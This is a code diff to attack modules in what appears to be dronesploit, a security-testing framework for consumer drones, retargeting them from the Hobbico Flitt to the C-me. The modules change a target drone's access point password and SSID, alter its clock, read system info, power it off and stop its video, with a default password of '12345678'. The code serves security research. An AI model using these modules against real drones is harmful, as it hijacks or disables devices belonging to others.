@@ -1,11 +1,11 @@
 # -*- coding: UTF-8 -*-
+from dronesploit.drones.hobbico import CmeModule
+from dronesploit.wifi.mixin import WifiConnectMixin
 from sploitkit import *
 
-from lib.drones.hobbico import FlittCommandModule
 
-
-class ChangeDatetime(FlittCommandModule):
-    """ Change the datetime of the target Flitt. """
+class ChangeDatetime(CmeModule):
+    """ Change the datetime of the target C-me. """
     config = Config({
         Option(
             'NEW_DATETIME',
@@ -24,51 +24,59 @@ class ChangeDatetime(FlittCommandModule):
         self._change_datetime(self.config.get("NEW_DATETIME"), self.config.get("DATETIME_FORMAT"))
 
 
-class ChangeApPassword(FlittCommandModule):
-    """ Change the password of the target Flitt's AP. """
+class ChangeApPassword(CmeModule):
+    """ Change the password of the target C-me's AP. """
     config = Config({
         Option(
             'NEW_PASSWORD',
             "Target's new password",
             True,
-        ): None,
+        ): "12345678",
     })
     
     def run(self):
         self._change_ap_creds(self.config.option("TARGET").value, self.config.option("NEW_PASSWORD").value, False)
 
 
-class ChangeApSsid(FlittCommandModule):
-    """ Change the SSID of the target Flitt's AP. """
+class ChangeApSsid(CmeModule, WifiConnectMixin):
+    """ Change the SSID of the target C-me's AP. """
     config = Config({
         Option(
             'NEW_SSID',
             "Target's new SSID",
             True,
-        ): None,
+        ): "C-me-abcdef",
     })
     
     def run(self):
         essid = self.config.option("TARGET").value
-        self._change_ap_creds(self.config.option("NEW_SSID").value, self.console.state['TARGETS'][essid]['password'])
+        new_essid = self.config.option("NEW_SSID").value
+        t = self.console.state['TARGETS']
+        pswd = t[essid]['password']
+        if self._change_ap_creds(new_essid, pswd):
+            t[new_essid] = {k: new_essid if k == "essid" else v for k, v in t[essid].items()}
+            self.config['NEW_SSID'] = essid
+            del t[essid]
+            self.console.root.interfaces
+            self.config['TARGET'] = new_essid if self.connect(new_essid) is not None else None
 
 
-class GetSysInfo(FlittCommandModule):
-    """ Get system information from the target Flitt. """
+class GetSysInfo(CmeModule):
+    """ Get system information from the target C-me. """
     def run(self):
         r = self._get_sysinfo()
         if r is not None:
             print_formatted_text(r)
 
 
-class PowerOff(FlittCommandModule):
-    """ Power off the target Flitt. """
+class PowerOff(CmeModule):
+    """ Power off the target C-me. """
     def run(self):
         self._power_off()
 
 
-class StopVideo(FlittCommandModule):
-    """ Stop video recording of the target Flitt. """
+class StopVideo(CmeModule):
+    """ Stop video recording of the target C-me. """
     def run(self):
         self._stop_video()
 
